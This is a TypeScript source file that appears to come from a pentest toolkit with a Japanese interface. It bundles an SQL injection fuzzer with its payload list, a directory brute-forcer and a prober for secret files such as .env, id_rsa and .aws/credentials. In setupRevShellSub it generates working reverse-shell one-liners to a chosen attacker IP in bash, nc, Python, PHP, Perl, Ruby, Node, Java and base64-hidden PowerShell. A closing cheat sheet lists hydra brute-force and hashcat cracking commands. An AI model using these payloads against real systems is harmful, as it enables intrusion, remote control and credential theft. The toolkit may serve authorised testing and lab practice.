    // それは「キャッチオール (SPA など)」とみなしてそのサイズの 200 を除外する。
    const baselineSizes = new Set<number>();
    try {
      const probes = [
        `__yuzu_probe_${Math.random().toString(36).slice(2, 10)}`,
        `__yuzu_probe_${Math.random().toString(36).slice(2, 10)}_x`,
      ];
      const probeSizes: number[] = [];
      for (const probe of probes) {
        const r = await invoke<HttpReqResultTS>("pentest_http_request", {
          method: "GET",
          url: `${base}/${probe}`,
          headers: [],
          body: null,
          timeoutMs: 8000,
          followRedirects: false,
        });
        if (r.status === 200) probeSizes.push(r.bytes);
      }
      // 2 つとも同じサイズならキャッチオール確定
      if (probeSizes.length === 2 && probeSizes[0] === probeSizes[1]) {
        baselineSizes.add(probeSizes[0]);
        outEl.textContent +=
          `[INFO] ソフト 404 検出: 存在しないパスでも 200 (${probeSizes[0]}B) を返します。\n` +
          `       このサイズの 200 応答は除外して表示します (本物だけ拾う)。\n\n`;
      }
    } catch {
      /* プローブ失敗は無視 */
    }
    // ----
    const queue = [...paths];
    async function worker(): Promise<void> {
      while (queue.length > 0 && !dbAbort) {
        const p = queue.shift()!;
        const url = `${base}/${p}`;
        try {
          const r = await invoke<HttpReqResultTS>("pentest_http_request", {
            method: "GET",
            url,
            headers: [],
            body: null,
            timeoutMs: 8000,
            followRedirects: false,
          });
          done++;
          // ソフト 404 と同じサイズの 200 は偽陽性として除外。
          const isSoft404 = r.status === 200 && baselineSizes.has(r.bytes);
          if (!excludeSet.has(r.status) && !isSoft404) {
            found++;
            outEl!.textContent += `[${r.status}] ${url}  (${r.bytes}B)\n`;
            outEl!.scrollTop = outEl!.scrollHeight;
          }
        } catch {
          done++;
        }
        if (statusEl) statusEl.textContent = `${done}/${total} (発見 ${found})`;
      }
    }
    const workers: Promise<void>[] = [];
    for (let i = 0; i < concurrency; i++) workers.push(worker());
    await Promise.all(workers);
    if (statusEl)
      statusEl.textContent = dbAbort
        ? `中断 (${done}/${total}, 発見 ${found})`
        : `完了 (${total}, 発見 ${found})`;
  });
}

const SQLI_PAYLOADS = [
  "'",
  '"',
  "' OR '1'='1",
  "' OR '1'='1' --",
  '" OR "1"="1',
  "' OR 1=1 --",
  "') OR ('1'='1",
  "' UNION SELECT NULL --",
  "' AND SLEEP(3) --",
  "1' AND 1=1--",
  "1' AND 1=2--",
  "admin'--",
  "admin'/*",
  "' OR 'a'='a",
];

const SQL_ERROR_PATTERNS = [
  /SQL syntax/i,
  /mysql_fetch/i,
  /You have an error in your SQL syntax/i,
  /Warning.*mysql/i,
  /MySQLSyntaxError/i,
  /PostgreSQL.*ERROR/i,
  /pg_query\(\)/i,
  /SQLite\/JDBCDriver/i,
  /sqlite3.OperationalError/i,
  /Microsoft.*ODBC.*SQL Server/i,
  /Unclosed quotation mark/i,
  /ORA-\d{5}/i,
  /sqlite_error/i,
  /supplied argument is not a valid MySQL/i,
];

function setupSqliSub(): void {
  const urlEl = document.getElementById("sqli-url") as HTMLInputElement | null;
  const methodEl = document.getElementById(
    "sqli-method",
  ) as HTMLSelectElement | null;
  const bodyEl = document.getElementById(
    "sqli-body",
  ) as HTMLTextAreaElement | null;
  const headersEl = document.getElementById(
    "sqli-headers",
  ) as HTMLInputElement | null;
  const runBtn = document.getElementById(
    "sqli-run",
  ) as HTMLButtonElement | null;
  const outEl = document.getElementById("sqli-out") as HTMLPreElement | null;
  if (!runBtn || !outEl) return;

  runBtn.addEventListener("click", async () => {
    const baseUrl = urlEl?.value.trim() || "";
    if (!baseUrl) {
      outEl.textContent = "URL 必須";
      return;
    }
    const method = methodEl?.value || "GET";
    const bodyTpl = bodyEl?.value || "";
    const headers = parseHeaderLines(headersEl?.value || "");
    const lines: string[] = [];
    lines.push(`# SQLi テスト: ${method} ${baseUrl}`);
    outEl.textContent = "テスト中…\n";

    // ベースラインリクエスト
    let baseResp: HttpReqResultTS | null = null;
    try {
      baseResp = await invoke<HttpReqResultTS>("pentest_http_request", {
        method,
        url: method === "GET" ? baseUrl : baseUrl,
        headers,
        body: method === "GET" ? null : bodyTpl.replace(/<FUZZ>/g, "x"),
        timeoutMs: 15000,
        followRedirects: false,
      });
      lines.push(
        `[baseline] ${baseResp.status} ${baseResp.status_text} (${baseResp.bytes}B, ${baseResp.time_ms}ms)`,
      );
    } catch (e) {
      lines.push(`[baseline] エラー: ${e}`);
    }

    for (const payload of SQLI_PAYLOADS) {
      let url = baseUrl;
      let body: string | null = null;
      if (method === "GET") {
        if (baseUrl.includes("<FUZZ>"))
          url = baseUrl.replace(/<FUZZ>/g, encodeURIComponent(payload));
        else {
          // 最後のパラメータ値に payload を追加
          url = baseUrl.replace(/=([^&]*)$/, `=${encodeURIComponent(payload)}`);
        }
      } else {
        body = bodyTpl.replace(/<FUZZ>/g, encodeURIComponent(payload));
      }
      try {
        const r = await invoke<HttpReqResultTS>("pentest_http_request", {
          method,
          url,
          headers,
          body,
          timeoutMs: 15000,
          followRedirects: false,
        });
        const flags: string[] = [];
        for (const re of SQL_ERROR_PATTERNS) {
          if (re.test(r.body)) {
            flags.push(`ERR(${re.source.slice(0, 20)})`);
            break;
          }
        }
        if (baseResp && Math.abs(r.bytes - baseResp.bytes) > 200) {
          flags.push(`Δlen=${r.bytes - baseResp.bytes}`);
        }
        if (baseResp && r.status !== baseResp.status) {
          flags.push(`Δstatus=${r.status}`);
        }
        if (r.time_ms > 2500 && payload.toLowerCase().includes("sleep")) {
          flags.push(`SLOW(${r.time_ms}ms)`);
        }
        const tag = flags.length ? ` ⚠️ ${flags.join(" ")}` : "";
        lines.push(
          `${r.status.toString().padStart(3)} ${r.bytes.toString().padStart(6)}B ${r.time_ms.toString().padStart(5)}ms  ${payload}${tag}`,
        );
        outEl.textContent = lines.join("\n");
      } catch (e) {
        lines.push(`ERR ${payload}: ${e}`);
        outEl.textContent = lines.join("\n");
      }
    }
    lines.push(
      "\n# ⚠️ マークがついた行は SQLi の可能性あり。sqlmap で詳細確認推奨",
    );
    outEl.textContent = lines.join("\n");
  });
}

interface HashSig {
  name: string;
  hashcat: string;
  pattern: RegExp;
}

const HASH_SIGNATURES: HashSig[] = [
  { name: "MD5", hashcat: "0", pattern: /^[a-f0-9]{32}$/i },
  { name: "SHA-1", hashcat: "100", pattern: /^[a-f0-9]{40}$/i },
  { name: "SHA-224", hashcat: "1300", pattern: /^[a-f0-9]{56}$/i },
  { name: "SHA-256", hashcat: "1400", pattern: /^[a-f0-9]{64}$/i },
  { name: "SHA-384", hashcat: "10800", pattern: /^[a-f0-9]{96}$/i },
  { name: "SHA-512", hashcat: "1700", pattern: /^[a-f0-9]{128}$/i },
  { name: "NTLM", hashcat: "1000", pattern: /^[a-f0-9]{32}$/i },
  { name: "MySQL323", hashcat: "200", pattern: /^[a-f0-9]{16}$/i },
  { name: "MySQL5", hashcat: "300", pattern: /^\*[A-F0-9]{40}$/i },
  {
    name: "bcrypt",
    hashcat: "3200",
    pattern: /^\$2[abxy]?\$\d+\$[./A-Za-z0-9]{53}$/,
  },
  {
    name: "MD5 crypt ($1$)",
    hashcat: "500",
    pattern: /^\$1\$[^$]{1,8}\$[./A-Za-z0-9]{22}$/,
  },
  {
    name: "SHA-256 crypt ($5$)",
    hashcat: "7400",
    pattern: /^\$5\$[^$]{1,16}\$[./A-Za-z0-9]{43}$/,
  },
  {
    name: "SHA-512 crypt ($6$)",
    hashcat: "1800",
    pattern: /^\$6\$[^$]{1,16}\$[./A-Za-z0-9]{86}$/,
  },
  {
    name: "Apache APR1 ($apr1$)",
    hashcat: "1600",
    pattern: /^\$apr1\$[^$]{1,8}\$[./A-Za-z0-9]{22}$/,
  },
  { name: "Argon2", hashcat: "—", pattern: /^\$argon2(id|i|d)\$/ },
  { name: "PBKDF2-SHA256", hashcat: "10900", pattern: /^pbkdf2_sha256\$/ },
  { name: "Django PBKDF2", hashcat: "10000", pattern: /^pbkdf2_sha\d+\$\d+\$/ },
  { name: "phpBB3 ($H$)", hashcat: "400", pattern: /^\$H\$[./A-Za-z0-9]{31}$/ },
  {
    name: "WordPress ($P$)",
    hashcat: "400",
    pattern: /^\$P\$[./A-Za-z0-9]{31}$/,
  },
  {
    name: "JWT",
    hashcat: "16500",
    pattern: /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/,
  },
  { name: "CRC32", hashcat: "11500", pattern: /^[a-f0-9]{8}$/i },
  { name: "LM", hashcat: "3000", pattern: /^[a-f0-9]{32}$/i },
];

function setupHashIdSub(): void {
  const inEl = document.getElementById("hi-input") as HTMLInputElement | null;
  const runBtn = document.getElementById("hi-run") as HTMLButtonElement | null;
  const outEl = document.getElementById("hi-out") as HTMLDivElement | null;
  if (!runBtn || !outEl) return;
  function detect(): void {
    const v = (inEl?.value || "").trim();
    if (!v) {
      outEl!.innerHTML = "";
      return;
    }
    const matches = HASH_SIGNATURES.filter((s) => s.pattern.test(v));
    if (matches.length === 0) {
      outEl!.innerHTML = `<span style="color:#cf222e">未知のハッシュ形式 (長さ: ${v.length})</span>`;
      return;
    }
    outEl!.innerHTML = matches
      .map(
        (m) =>
          `<div style="padding:4px 8px;border:1px solid #ddd;border-radius:4px;margin-bottom:4px;background:#fff"><strong>${escapeHtml(m.name)}</strong> <code style="color:#666">hashcat -m ${m.hashcat}</code> &nbsp; <code style="color:#666">john --format=${m.name.toLowerCase().replace(/\s.*/, "")}</code></div>`,
      )
      .join("");
  }
  runBtn.addEventListener("click", detect);
  inEl?.addEventListener("input", detect);
}

async function digestHex(algo: string, text: string): Promise<string> {
  const buf = new TextEncoder().encode(text);
  const out = await crypto.subtle.digest(algo, buf);
  return [...new Uint8Array(out)]
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

function md5(text: string): string {
  // 簡易 MD5 実装 (RFC1321)
  function add32(a: number, b: number): number {
    return (a + b) & 0xffffffff;
  }
  function rol(n: number, c: number): number {
    return (n << c) | (n >>> (32 - c));
  }
  function cmn(
    q: number,
    a: number,
    b: number,
    x: number,
    s: number,
    t: number,
  ): number {
    a = add32(add32(a, q), add32(x, t));
    return add32(rol(a, s), b);
  }
  function ff(
    a: number,
    b: number,
    c: number,
    d: number,
    x: number,
    s: number,
    t: number,
  ): number {
    return cmn((b & c) | (~b & d), a, b, x, s, t);
  }
  function gg(
    a: number,
    b: number,
    c: number,
    d: number,
    x: number,
    s: number,
    t: number,
  ): number {
    return cmn((b & d) | (c & ~d), a, b, x, s, t);
  }
  function hh(
    a: number,
    b: number,
    c: number,
    d: number,
    x: number,
    s: number,
    t: number,
  ): number {
    return cmn(b ^ c ^ d, a, b, x, s, t);
  }
  function ii(
    a: number,
    b: number,
    c: number,
    d: number,
    x: number,
    s: number,
    t: number,
  ): number {
    return cmn(c ^ (b | ~d), a, b, x, s, t);
  }
  const bytes: number[] = [];
  const enc = new TextEncoder().encode(text);
  for (const b of enc) bytes.push(b);
  const len = bytes.length * 8;
  bytes.push(0x80);
  while (bytes.length % 64 !== 56) bytes.push(0);
  for (let i = 0; i < 8; i++) bytes.push((len >>> (8 * i)) & 0xff);
  let a = 0x67452301,
    b = 0xefcdab89,
    c = 0x98badcfe,
    d = 0x10325476;
  for (let i = 0; i < bytes.length; i += 64) {
    const x: number[] = new Array(16);
    for (let j = 0; j < 16; j++) {
      x[j] =
        bytes[i + j * 4] |
        (bytes[i + j * 4 + 1] << 8) |
        (bytes[i + j * 4 + 2] << 16) |
        (bytes[i + j * 4 + 3] << 24);
    }
    const aa = a,
      bb = b,
      cc = c,
      dd = d;
    a = ff(a, b, c, d, x[0], 7, -680876936);
    d = ff(d, a, b, c, x[1], 12, -389564586);
    c = ff(c, d, a, b, x[2], 17, 606105819);
    b = ff(b, c, d, a, x[3], 22, -1044525330);
    a = ff(a, b, c, d, x[4], 7, -176418897);
    d = ff(d, a, b, c, x[5], 12, 1200080426);
    c = ff(c, d, a, b, x[6], 17, -1473231341);
    b = ff(b, c, d, a, x[7], 22, -45705983);
    a = ff(a, b, c, d, x[8], 7, 1770035416);
    d = ff(d, a, b, c, x[9], 12, -1958414417);
    c = ff(c, d, a, b, x[10], 17, -42063);
    b = ff(b, c, d, a, x[11], 22, -1990404162);
    a = ff(a, b, c, d, x[12], 7, 1804603682);
    d = ff(d, a, b, c, x[13], 12, -40341101);
    c = ff(c, d, a, b, x[14], 17, -1502002290);
    b = ff(b, c, d, a, x[15], 22, 1236535329);
    a = gg(a, b, c, d, x[1], 5, -165796510);
    d = gg(d, a, b, c, x[6], 9, -1069501632);
    c = gg(c, d, a, b, x[11], 14, 643717713);
    b = gg(b, c, d, a, x[0], 20, -373897302);
    a = gg(a, b, c, d, x[5], 5, -701558691);
    d = gg(d, a, b, c, x[10], 9, 38016083);
    c = gg(c, d, a, b, x[15], 14, -660478335);
    b = gg(b, c, d, a, x[4], 20, -405537848);
    a = gg(a, b, c, d, x[9], 5, 568446438);
    d = gg(d, a, b, c, x[14], 9, -1019803690);
    c = gg(c, d, a, b, x[3], 14, -187363961);
    b = gg(b, c, d, a, x[8], 20, 1163531501);
    a = gg(a, b, c, d, x[13], 5, -1444681467);
    d = gg(d, a, b, c, x[2], 9, -51403784);
    c = gg(c, d, a, b, x[7], 14, 1735328473);
    b = gg(b, c, d, a, x[12], 20, -1926607734);
    a = hh(a, b, c, d, x[5], 4, -378558);
    d = hh(d, a, b, c, x[8], 11, -2022574463);
    c = hh(c, d, a, b, x[11], 16, 1839030562);
    b = hh(b, c, d, a, x[14], 23, -35309556);
    a = hh(a, b, c, d, x[1], 4, -1530992060);
    d = hh(d, a, b, c, x[4], 11, 1272893353);
    c = hh(c, d, a, b, x[7], 16, -155497632);
    b = hh(b, c, d, a, x[10], 23, -1094730640);
    a = hh(a, b, c, d, x[13], 4, 681279174);
    d = hh(d, a, b, c, x[0], 11, -358537222);
    c = hh(c, d, a, b, x[3], 16, -722521979);
    b = hh(b, c, d, a, x[6], 23, 76029189);
    a = hh(a, b, c, d, x[9], 4, -640364487);
    d = hh(d, a, b, c, x[12], 11, -421815835);
    c = hh(c, d, a, b, x[15], 16, 530742520);
    b = hh(b, c, d, a, x[2], 23, -995338651);
    a = ii(a, b, c, d, x[0], 6, -198630844);
    d = ii(d, a, b, c, x[7], 10, 1126891415);
    c = ii(c, d, a, b, x[14], 15, -1416354905);
    b = ii(b, c, d, a, x[5], 21, -57434055);
    a = ii(a, b, c, d, x[12], 6, 1700485571);
    d = ii(d, a, b, c, x[3], 10, -1894986606);
    c = ii(c, d, a, b, x[10], 15, -1051523);
    b = ii(b, c, d, a, x[1], 21, -2054922799);
    a = ii(a, b, c, d, x[8], 6, 1873313359);
    d = ii(d, a, b, c, x[15], 10, -30611744);
    c = ii(c, d, a, b, x[6], 15, -1560198380);
    b = ii(b, c, d, a, x[13], 21, 1309151649);
    a = ii(a, b, c, d, x[4], 6, -145523070);
    d = ii(d, a, b, c, x[11], 10, -1120210379);
    c = ii(c, d, a, b, x[2], 15, 718787259);
    b = ii(b, c, d, a, x[9], 21, -343485551);
    a = add32(a, aa);
    b = add32(b, bb);
    c = add32(c, cc);
    d = add32(d, dd);
  }
  function hex(n: number): string {
    let s = "";
    for (let i = 0; i < 4; i++)
      s += ((n >>> (i * 8)) & 0xff).toString(16).padStart(2, "0");
    return s;
  }
  return hex(a) + hex(b) + hex(c) + hex(d);
}

function setupHashGenSub(): void {
  const inEl = document.getElementById(
    "hg-input",
  ) as HTMLTextAreaElement | null;
  const runBtn = document.getElementById("hg-run") as HTMLButtonElement | null;
  const outEl = document.getElementById("hg-out") as HTMLPreElement | null;
  if (!runBtn || !outEl) return;
  runBtn.addEventListener("click", async () => {
    const text = inEl?.value || "";
    const lines: string[] = [];
    lines.push(`MD5     : ${md5(text)}`);
    lines.push(`SHA-1   : ${await digestHex("SHA-1", text)}`);
    lines.push(`SHA-256 : ${await digestHex("SHA-256", text)}`);
    lines.push(`SHA-384 : ${await digestHex("SHA-384", text)}`);
    lines.push(`SHA-512 : ${await digestHex("SHA-512", text)}`);
    lines.push(`Base64  : ${btoa(unescape(encodeURIComponent(text)))}`);
    lines.push(`URL enc : ${encodeURIComponent(text)}`);
    outEl.textContent = lines.join("\n");
  });
}

function setupEncodeSub(): void {
  const modeEl = document.getElementById(
    "enc-mode",
  ) as HTMLSelectElement | null;
  const runBtn = document.getElementById("enc-run") as HTMLButtonElement | null;
  const inEl = document.getElementById(
    "enc-input",
  ) as HTMLTextAreaElement | null;
  const outEl = document.getElementById(
    "enc-output",
  ) as HTMLTextAreaElement | null;
  if (!runBtn || !inEl || !outEl) return;
  runBtn.addEventListener("click", () => {
    const text = inEl.value;
    const mode = modeEl?.value || "b64e";
    try {
      let r = "";
      if (mode === "b64e") r = btoa(unescape(encodeURIComponent(text)));
      else if (mode === "b64d") r = decodeURIComponent(escape(atob(text)));
      else if (mode === "urle") r = encodeURIComponent(text);
      else if (mode === "urld") r = decodeURIComponent(text);
      else if (mode === "htme")
        r = text.replace(
          /[&<>"']/g,
          (c) =>
            ({
              "&": "&amp;",
              "<": "&lt;",
              ">": "&gt;",
              '"': "&quot;",
              "'": "&#39;",
            })[c]!,
        );
      else if (mode === "htmd")
        r = text.replace(
          /&(amp|lt|gt|quot|#39|nbsp);/g,
          (_m, e) =>
            ({ amp: "&", lt: "<", gt: ">", quot: '"', "#39": "'", nbsp: " " })[
              e as string
            ] || _m,
        );
      else if (mode === "hexe")
        r = [...new TextEncoder().encode(text)]
          .map((b) => b.toString(16).padStart(2, "0"))
          .join("");
      else if (mode === "hexd") {
        const cleaned = text.replace(/[^a-fA-F0-9]/g, "");
        const bytes = new Uint8Array(cleaned.length / 2);
        for (let i = 0; i < bytes.length; i++)
          bytes[i] = parseInt(cleaned.substr(i * 2, 2), 16);
        r = new TextDecoder().decode(bytes);
      } else if (mode === "rot13")
        r = text.replace(/[a-zA-Z]/g, (c) => {
          const a = c <= "Z" ? 65 : 97;
          return String.fromCharCode(((c.charCodeAt(0) - a + 13) % 26) + a);
        });
      outEl.value = r;
    } catch (e) {
      outEl.value = `エラー: ${e}`;
    }
  });
}

function setupRevShellSub(): void {
  const hostEl = document.getElementById("rs-host") as HTMLInputElement | null;
  const portEl = document.getElementById("rs-port") as HTMLInputElement | null;
  const shellEl = document.getElementById(
    "rs-shell",
  ) as HTMLSelectElement | null;
  const outEl = document.getElementById("rs-out") as HTMLPreElement | null;
  if (!hostEl || !outEl) return;
  function gen(): void {
    const ip = hostEl!.value || "10.10.14.1";
    const port = portEl?.value || "4444";
    const sh = shellEl?.value || "/bin/bash";
    const b64 = btoa(`bash -i >& /dev/tcp/${ip}/${port} 0>&1`);
    const psB64 = btoa(
      `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
        .split("")
        .map((c) => c + "\0")
        .join(""),
    );
    const lines = [
      `# === リスナー ===`,
      `nc -lvnp ${port}`,
      `rlwrap nc -lvnp ${port}    # 矢印キー使える版`,
      ``,
      `# === bash ===`,
      `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
      `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
      `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`,
      `# Base64 で難読化:`,
      `echo ${b64} | base64 -d | bash`,
      ``,
      `# === sh / nc ===`,
      `sh -i 5<> /dev/tcp/${ip}/${port} 0<&5 1>&5 2>&5`,
      `mkfifo /tmp/f; cat /tmp/f|${sh} -i 2>&1|nc ${ip} ${port} >/tmp/f`,
      `nc ${ip} ${port} -e ${sh}                # 古い nc`,
      `nc -c ${sh} ${ip} ${port}                # OpenBSD nc`,
      ``,
      `# === Python ===`,
      `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${sh}","-i"])'`,
      `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${sh}","-i"])'`,
      ``,
      `# === PHP ===`,
      `php -r '$sock=fsockopen("${ip}",${port});exec("${sh} -i <&3 >&3 2>&3");'`,
      `php -r '$s=fsockopen("${ip}",${port});shell_exec("${sh} -i <&3 >&3 2>&3");'`,
      ``,
      `# === Perl ===`,
      `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${sh} -i");};'`,
      ``,
      `# === Ruby ===`,
      `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
      ``,
      `# === Node.js ===`,
      `node -e 'require("child_process").exec("nc -e ${sh} ${ip} ${port}")'`,
      ``,
      `# === PowerShell (Windows) ===`,
      `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
      `# Base64 (-EncodedCommand 用):`,
      `powershell -nop -w hidden -e ${psB64}`,
      ``,
      `# === Java ===`,
      `r = Runtime.getRuntime(); p = r.exec(["${sh}","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor();`,
      ``,
      `# === シェル安定化 (接続後 victim 側で実行) ===`,
      `python3 -c 'import pty;pty.spawn("${sh}")'`,
      `export TERM=xterm-256color`,
      `Ctrl+Z   stty raw -echo;fg   reset`,
    ];
    outEl!.textContent = lines.join("\n");
  }
  hostEl.addEventListener("input", gen);
  portEl?.addEventListener("input", gen);
  shellEl?.addEventListener("change", gen);
  gen();
}

function setupJwtSub(): void {
  const inEl = document.getElementById(
    "jwt-input",
  ) as HTMLTextAreaElement | null;
  const runBtn = document.getElementById("jwt-run") as HTMLButtonElement | null;
  const hEl = document.getElementById("jwt-header") as HTMLPreElement | null;
  const pEl = document.getElementById("jwt-payload") as HTMLPreElement | null;
  const sEl = document.getElementById("jwt-sig") as HTMLPreElement | null;
  if (!runBtn || !inEl) return;
  function b64urlDecode(s: string): string {
    s = s.replace(/-/g, "+").replace(/_/g, "/");
    while (s.length % 4) s += "=";
    try {
      return decodeURIComponent(escape(atob(s)));
    } catch {
      return atob(s);
    }
  }
  function go(): void {
    const t = inEl!.value.trim();
    const parts = t.split(".");
    if (parts.length < 2) {
      if (hEl) hEl.textContent = "形式が JWT ではありません";
      if (pEl) pEl.textContent = "";
      if (sEl) sEl.textContent = "";
      return;
    }
    try {
      const h = JSON.parse(b64urlDecode(parts[0]));
      const p = JSON.parse(b64urlDecode(parts[1]));
      if (hEl) hEl.textContent = JSON.stringify(h, null, 2);
      if (pEl) pEl.textContent = JSON.stringify(p, null, 2);
      if (sEl) sEl.textContent = parts[2] || "(なし)";
    } catch (e) {
      if (hEl) hEl.textContent = `デコード失敗: ${e}`;
    }
  }
  runBtn.addEventListener("click", go);
  inEl.addEventListener("input", go);
}

function setupDnsSub(): void {
  const hostEl = document.getElementById("dns-host") as HTMLInputElement | null;
  const typeEl = document.getElementById(
    "dns-type",
  ) as HTMLSelectElement | null;
  const runBtn = document.getElementById("dns-run") as HTMLButtonElement | null;
  const outEl = document.getElementById("dns-out") as HTMLPreElement | null;
  if (!runBtn || !outEl) return;
  runBtn.addEventListener("click", async () => {
    const name = (hostEl?.value || "").trim();
    if (!name) {
      outEl.textContent = "ホスト名を入力";
      return;
    }
    const type = typeEl?.value || "A";
    outEl.textContent = "クエリ中…";
    try {
      const url = `https://dns.google/resolve?name=${encodeURIComponent(name)}&type=${type}`;
      const r = await invoke<HttpReqResultTS>("pentest_http_request", {
        method: "GET",
        url,
        headers: [["Accept", "application/dns-json"]],
        body: null,
        timeoutMs: 10000,
        followRedirects: true,
      });
      const data = JSON.parse(r.body);
      const lines: string[] = [];
      lines.push(`Query: ${name} (${type})`);
      lines.push(`Status: ${data.Status} (0=NOERROR)`);
      if (data.Answer) {
        lines.push("─ Answer ─");
        for (const a of data.Answer) {
          lines.push(`  ${a.name}\t${a.TTL}\t${typeName(a.type)}\t${a.data}`);
        }
      }
      if (data.Authority) {
        lines.push("─ Authority ─");
        for (const a of data.Authority) {
          lines.push(`  ${a.name}\t${a.TTL}\t${typeName(a.type)}\t${a.data}`);
        }
      }
      outEl.textContent = lines.join("\n");
    } catch (e) {
      outEl.textContent = `エラー: ${e}`;
    }
  });
  function typeName(n: number): string {
    return (
      (
        {
          1: "A",
          2: "NS",
          5: "CNAME",
          6: "SOA",
          12: "PTR",
          15: "MX",
          16: "TXT",
          28: "AAAA",
          33: "SRV",
        } as Record<number, string>
      )[n] || String(n)
    );
  }
}

function setupSensitiveFilesSub(): void {
  const baseEl = document.getElementById("sf-base") as HTMLInputElement | null;
  const runBtn = document.getElementById("sf-run") as HTMLButtonElement | null;
  const outEl = document.getElementById("sf-out") as HTMLPreElement | null;
  if (!runBtn || !outEl) return;
  const PATHS = [
    "robots.txt",
    "sitemap.xml",
    ".git/HEAD",
    ".git/config",
    ".gitignore",
    ".env",
    ".env.local",
    ".env.production",
    ".htaccess",
    ".htpasswd",
    ".svn/entries",
    ".DS_Store",
    "config.php",
    "config.php.bak",
    "wp-config.php",
    "wp-config.php.bak",
    "phpinfo.php",
    "info.php",
    "test.php",
    "server-status",
    "server-info",
    ".well-known/security.txt",
    "crossdomain.xml",
    "backup.zip",
    "backup.tar.gz",
    "db.sql",
    "dump.sql",
    "id_rsa",
    "composer.json",
    "package.json",
    "Gemfile",
    ".aws/credentials",
    ".npmrc",
    ".bash_history",
    "console",
    "actuator",
    "actuator/health",
    "actuator/env",
    "swagger.json",
    "swagger-ui.html",
    "api/swagger",
    "api-docs",
    "graphql",
  ];
  runBtn.addEventListener("click", async () => {
    const base = (baseEl?.value || "").trim().replace(/\/+$/, "");
    if (!base) {
      outEl.textContent = "ベースURL 必須";
      return;
    }
    outEl.textContent = "";

    // ---- ソフト 404 検出 ----
    // 存在しないパスを 2 つプローブして、両方とも同じサイズの 200 を返したら
    // それは「キャッチオール (SPA など)」とみなしてそのサイズの 200 を除外する。
    const baselineSizes = new Set<number>();
    try {
      const probes = [
        `__yuzu_probe_${Math.random().toString(36).slice(2, 10)}`,
        `__yuzu_probe_${Math.random().toString(36).slice(2, 10)}_x`,
      ];
      const probeSizes: number[] = [];
      for (const probe of probes) {
        const r = await invoke<HttpReqResultTS>("pentest_http_request", {
          method: "GET",
          url: `${base}/${probe}`,
          headers: [],
          body: null,
          timeoutMs: 5000,
          followRedirects: false,
        });
        if (r.status === 200) probeSizes.push(r.bytes);
      }
      if (probeSizes.length === 2 && probeSizes[0] === probeSizes[1]) {
        baselineSizes.add(probeSizes[0]);
        outEl.textContent +=
          `[INFO] ソフト 404 検出: 存在しないパスでも 200 (${probeSizes[0]}B) を返します。\n` +
          `       このサイズの 200 応答は偽陽性として除外します。\n\n`;
      }
    } catch {
      /* プローブ失敗は無視 */
    }
    // ----

    for (const p of PATHS) {
      const url = `${base}/${p}`;
      try {
        const r = await invoke<HttpReqResultTS>("pentest_http_request", {
          method: "GET",
          url,
          headers: [],
          body: null,
          timeoutMs: 5000,
          followRedirects: false,
        });
        const isSoft404 = r.status === 200 && baselineSizes.has(r.bytes);
        const interesting =
          !isSoft404 &&
          (r.status === 200 || r.status === 401 || r.status === 403);
        const tag = interesting ? "⚠️" : isSoft404 ? "🚫" : "  ";
        const note = isSoft404 ? " (ソフト404)" : "";
        outEl.textContent += `${tag} [${r.status}] ${url}  (${r.bytes}B)${note}\n`;
        outEl.scrollTop = outEl.scrollHeight;
      } catch {
        outEl.textContent += `   [ERR] ${url}\n`;
      }
    }
  });
}

const THM_CHEAT = `# === 偵察 ===
nmap -sC -sV -oN nmap.log <IP>
nmap -p- --min-rate 1000 <IP>          # 全 65535 ポート高速
nmap -sU --top-ports 50 <IP>            # UDP top 50
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --hc 404 http://<IP>/FUZZ
nikto -h http://<IP>
whatweb http://<IP>

# === SMB ===
enum4linux -a <IP>
smbclient -L //<IP> -N
smbclient //<IP>/share -N
smbmap -H <IP>

# === ブルートフォース ===
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<IP>
hydra -L users.txt -P pass.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -l admin -P rockyou.txt <IP> ftp

# === ハッシュ ===
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt        # MD5
hashcat -m 1000 hash.txt rockyou.txt                          # NTLM
hashcat -m 1600 '$apr1$...' rockyou.txt                       # APR1
